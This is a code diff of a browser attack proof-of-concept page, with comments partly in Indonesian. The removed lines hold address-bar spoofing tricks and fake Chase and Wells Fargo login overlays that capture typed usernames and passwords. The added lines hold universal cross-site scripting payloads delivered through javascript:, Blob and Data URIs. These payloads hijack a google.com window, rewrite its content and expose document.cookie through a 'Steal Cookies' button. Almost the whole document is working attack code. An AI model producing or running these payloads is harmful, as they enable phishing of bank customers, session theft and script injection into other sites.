-        const msg = "You have unsaved changes. Are you sure you want to leave?";
-        e.returnValue = msg;
-        return msg;
-    };
-    
-    function triggerPortSpoof() {
-        logPort('Mencoba navigasi ke localhost:12345 (closed port)...', true);
-        logPort('Setelah user menekan "Leave", URL akan menunjukkan bank.com di omnibox', true);
-        window.location.href = 'http://localhost:12345/spoof-test';
-        setTimeout(() => {
-            logPort('Jika browser vulnerable, URL stuck dengan domain sebelumnya', true);
-        }, 500);
-    }
-    
-    function simulateBankNavigation() {
-        logPort('Simulasi: User think they are on chase.com', true);
-        const fakeMsg = document.createElement('div');
-        fakeMsg.className = 'status status-vuln';
-        fakeMsg.innerHTML = '🎭 [SPOOF ACTIVE] Omnibox menunjukkan https://chase.com tapi ini halaman attacker!';
-        document.querySelector('#portLog').parentNode.appendChild(fakeMsg);
-        setTimeout(() => fakeMsg.remove(), 5000);
-    }
-    
-    function capturePortCreds() {
-        const user = document.getElementById('portUser').value;
-        const pass = document.getElementById('portPass').value;
-        if (user || pass) {
-            logPort(`[CHASE SPOOF] ${user}:${pass} captured via beforeunload attack`, true);
-            alert(`[POC] Chase credentials: ${user}\nURL bar shows chase.com but page is fake!`);
+    function uxssWindowName() {
+        log('output3', '🚀 EXECUTING: Window name reuse UXSS', 'success');
+        
+        // Reuse existing window with same name
+        const payload = 'javascript:alert("[UXSS] This alert runs on the Google tab!\\n\\nThe attacker has hijacked this window and can execute arbitrary code."); document.body.innerHTML = "<h1 style=color:red>🔥 HACKED VIA UXSS</h1><p>This is still https://www.google.com but content is controlled by attacker!</p><button onclick=alert(document.cookie)>Steal Cookies</button>";';
+        
+        const attackWindow = window.open(payload, 'GOOGLE_TARGET');
+        
+        if (attackWindow) {
+            log('output3', '✅ UXSS payload sent to existing Google window!', 'success');
+            log('output3', '🎯 Check the Google tab - alert should appear', 'success');
+        } else {
+            log('output3', '❌ Failed to hijack window - make sure Google window is open first', 'error');
         }
     }
     
     // ============================================
-    // MODULE 5: PROTOTYPE OVERRIDE
+    // TECHNIQUE 4: Blob URI
     // ============================================
-    let prototypeLog = document.getElementById('prototypeLog');
-    
-    function logProto(msg, isVuln = false) {
-        const prefix = isVuln ? '⚠️' : '🔧';
-        prototypeLog.innerHTML += `\n${new Date().toLocaleTimeString()} ${prefix} ${msg}`;
-        prototypeLog.scrollTop = prototypeLog.scrollHeight;
-    }
-    
-    function testPrototypeOverride() {
-        logProto('Testing Function.prototype.call override...');
+    function uxssBlobURI() {
+        log('output4', '🚀 EXECUTING: Blob URI UXSS technique', 'success');
         
-        const originalCall = Function.prototype.call;
-        let overridden = false;
+        const uxssScript = `
+            <!DOCTYPE html>
+            <html>
+            <head><title>UXSS via Blob</title></head>
+            <body>
+                <h1>🔥 UXSS Payload</h1>
+                <p>Attacking google.com...</p>
+                <div id="result"></div>
+                <script>
+                    // Create iframe to google.com
+                    const iframe = document.createElement('iframe');
+                    iframe.src = 'https://www.google.com';
+                    iframe.style.width = '100%';
+                    iframe.style.height = '400px';
+                    document.body.appendChild(iframe);
+                    
+                    // Attempt to inject after load
+                    iframe.onload = function() {
+                        try {
+                            // This will fail due to SOP normally, but UXSS bypasses
+                            const uxssFrame = document.createElement('iframe');
+                            uxssFrame.src = 'javascript:alert("[UXSS] Cross-origin script execution on google.com!\\n\\nThis proves UXSS vulnerability!\\n\\nCurrent URL: \" + location.href); document.body.innerHTML = "<h1 style=color:red>🔥 HACKED</h1><p>Cross-origin script executed!</p><button onclick=alert(document.cookie)>Show Cookies</button>";';
+                            iframe.contentWindow.document.body.appendChild(uxssFrame);
+                            document.getElementById('result').innerHTML = '<p style="color:green">✅ UXSS payload injected into google.com iframe!</p>';
+                        } catch(e) {
+                            document.getElementById('result').innerHTML = '<p style="color:red">❌ SOP blocked: ' + e.message + '</p>';
+                        }
+                    };
+                <\/script>
+            </body>
+            </html>
+        `;
         
-        try {
-            Function.prototype.call = function(e) {
-                overridden = true;
-                logProto('✅ SUCCESS: Function.prototype.call berhasil di-override!', true);
-                document.getElementById('prototypeStatus').innerHTML = '<div class="status status-vuln">⚠️ VULNERABLE - Prototype dapat di-override (Brave/Electron legacy risk)</div>';
-                return originalCall.apply(this, arguments);
-            };
-            
-            // Test
-            alert('Test');
-            
-            if (overridden) {
-                logProto('Browser vulnerable ke UXSS via prototype pollution chain', true);
-            }
-        } catch(e) {
-            logProto('❌ Cannot override prototype (protected)');
-            document.getElementById('prototypeStatus').innerHTML = '<div class="status status-safe">✅ Protected dari prototype override</div>';
+        const blob = new Blob([uxssScript], { type: 'text/html' });
+        const blobUrl = URL.createObjectURL(blob);
+        
+        const newWindow = window.open(blobUrl, '_blank');
+        
+        if (newWindow) {
+            log('output4', '✅ Blob URL window opened with UXSS payload', 'success');
+            setTimeout(() => {
+                URL.revokeObjectURL(blobUrl);
+            }, 10000);
+        } else {
+            log('output4', '❌ Popup blocked!', 'error');
         }
-        
-        // Restore
-        Function.prototype.call = originalCall;
-    }
-    
-    function simulateUXSS() {
-        logProto('Simulating cross-origin script execution...', true);
-        document.getElementById('uxssPayload').style.display = 'block';
-        document.getElementById('uxssPayload').innerHTML = `// UXSS Payload - would execute on google.com
-        fetch('https://google.com').then(r => r.text()).then(html => {
-            // Extract CSRF tokens, cookies, etc.
-            console.log('[UXSS] Cross-origin content accessed');
-        });`;
-        
-        const iframe = document.getElementById('uxssTarget');
-        iframe.src = 'https://example.com';
-        logProto('iframe navigated to example.com - UXSS would inject script across origins', true);
     }
     
     // ============================================
-    // MODULE 6: FULL DEMO
+    // TECHNIQUE 5: Data URI
     // ============================================
-    let demoLog = document.getElementById('demoLog');
-    
-    function logDemo(msg, isVuln = false) {
-        const prefix = isVuln ? '💀' : '🔍';
-        demoLog.innerHTML += `\n${new Date().toLocaleTimeString()} ${prefix} ${msg}`;
-        demoLog.scrollTop = demoLog.scrollHeight;
+    function uxssDataURI() {
+        log('output5', '🚀 EXECUTING: Data URI UXSS technique', 'success');
+        
+        const dataUri = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>UXSS via Data URI</title></head>
+            <body>
+                <h1>🔥 UXSS Data URI Payload</h1>
+                <p>Attempting to execute cross-origin script on google.com...</p>
+                <div id="status"></div>
+                <script>
+                    document.getElementById('status').innerHTML = '<p>⏳ Opening google.com with javascript: payload...</p>';
+                    
+                    // Open google.com with javascript: injection
+                    setTimeout(() => {
+                        const uxssWindow = window.open('javascript:alert("[UXSS] This alert is running on https://www.google.com!\\n\\nProves UXSS vulnerability exists!"); document.body.style.backgroundColor = "#ff0000"; document.body.innerHTML = "<center><h1 style=color:white>🔥 UXSS SUCCESS</h1><p>This is still https://www.google.com but content is hacked!</p><button onclick=alert(document.cookie) style=padding:10px;margin:10px>Steal Cookies</button><p>URL: \" + location.href + \"</p></center>";', '_blank');
+                        
+                        if(uxssWindow) {
+                            document.getElementById('status').innerHTML = '<p style="color:green">✅ UXSS payload sent to google.com! Check the new tab.</p>';
+                        } else {
+                            document.getElementById('status').innerHTML = '<p style="color:red">❌ Popup blocked! Please allow popups for this site.</p>';
+                        }
+                    }, 2000);
+                <\/script>
+            </body>
+            </html>
+        `);
+        
+        const newWindow = window.open(dataUri, '_blank');
+        
+        if (newWindow) {
+            log('output5', '✅ Data URI window opened with UXSS payload', 'success');
+            log('output5', '⏳ Will attempt to inject into google.com in 2 seconds', 'info');
+        } else {
+            log('output5', '❌ Popup blocked!', 'error');
+        }
     }
     
-    function fullDemoAttack() {
-        logDemo('🚀 INITIATING COMPLETE ADDRESS BAR SPOOF ATTACK CHAIN', true);
-        
-        // Step 1: Override beforeunload
-        logDemo('[1/5] Setting up beforeunload trap');
-        const originalBeforeUnload = window.onbeforeunload;
-        window.onbeforeunload = () => "Session expiring - please re-login";
-        
-        // Step 2: Spoof URL via timing
-        logDemo('[2/5] Attempting URL bar spoof via timing');
-        
-        // Step 3: Show fake banking modal
-        setTimeout(() => {
-            logDemo('[3/5] Displaying fake banking login with spoofed URL bar', true);
-            const fakeOverlay = document.createElement('div');
-            fakeOverlay.id = 'fullscreenSpoof';
-            fakeOverlay.style.cssText = `
-                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-                background: white; z-index: 10000; display: flex;
-                justify-content: center; align-items: center; flex-direction: column;
-            `;
-            fakeOverlay.innerHTML = `
-                <div style="background:white; padding:40px; border-radius:20px; box-shadow:0 20px 60px black; text-align:center; max-width:400px;">
-                    <div style="background:#2ecc71; color:white; padding:5px 10px; border-radius:5px; margin-bottom:20px; font-size:12px;">
-                        🔒 Secure Connection | https://wellsfargo.com
-                    </div>
-                    <h2>Session Expired</h2>
-                    <p>Please re-enter your credentials to continue</p>
-                    <input type="text" id="fullUser" placeholder="Username" style="width:90%; margin:10px 0; padding:12px;">
-                    <input type="password" id="fullPass" placeholder="Password" style="width:90%; margin:10px 0; padding:12px;">
-                    <button onclick="document.getElementById('fullUser').value = 'poc_test_user'" style="background:#3498db; padding:10px 20px;">Submit</button>
-                    <p style="font-size:10px; margin-top:20px;">© Wells Fargo Bank</p>
-                </div>
-            `;
-            document.body.appendChild(fakeOverlay);
-            
-            // Step 4: Capture
-            const submitBtn = fakeOverlay.querySelector('button');
-            submitBtn.onclick = () => {
-                const user = document.getElementById('fullUser')?.value || '';
-                const pass = document.getElementById('fullPass')?.value || '';
-                logDemo(`[4/5] CREDENTIALS CAPTURED: ${user}:${pass}`, true);
-                alert(`[POC COMPLETE] Credentials stolen: ${user}\n\nAddress bar showed https://wellsfargo.com but this was an attacker page!`);
-                fakeOverlay.remove();
-                window.onbeforeunload = originalBeforeUnload;
-            };
-        }, 500);
-        
-        logDemo('[5/5] Attack chain active - cek address bar browser!', true);
-    }
-    
-    function resetDemo() {
-        const overlay = document.getElementById('fullscreenSpoof');
-        if (overlay) overlay.remove();
-        logDemo('Demo reset - attack chain terminated');
-        window.onbeforeunload = null;
-    }
-    
-    // Auto-run initial detection
+    // ============================================
+    // Additional: Direct Popup with javascript:
+    // ============================================
+    // Auto-execute one technique that works in most modern browsers
     setTimeout(() => {
-        logArc('ARC Browser detection module loaded');
-        logChrome('Chrome Split View module loaded - right click on green area to test');
-        logTiming('Timing attack module ready');
-        logPort('Port closed spoof module ready - beforeunload trap active');
-        logProto('Prototype override module ready');
-        logDemo('Complete POC suite loaded - 6 attack vectors available');
-        
-        // Browser detection
-        const ua = navigator.userAgent;
-        if (ua.includes('Arc')) logArc('✓ Arc Browser detected', true);
-        if (ua.includes('Chrome') && !ua.includes('Edg')) logChrome('✓ Chrome detected', true);
-        if (ua.includes('Safari') && !ua.includes('Chrome')) logTiming('✓ Safari detected - timing attack effective');
+        log('output1', '💡 Tip: UXSS yang paling mungkin bekerja di browser modern adalah Technique #1 dan #3', 'info');
+        log('output1', '💡 Pastikan popups di-allow untuk website ini', 'info');
     }, 1000);
+    
+    // Direct injection attempt
+    window.addEventListener('load', () => {
+        console.log('[UXSS POC] Loaded - ready to execute cross-origin attacks');
+        console.log('[UXSS POC] Techniques: javascript: protocol, window.name reuse, about:blank control');
+    });
 </script>
 </body>
 </html>
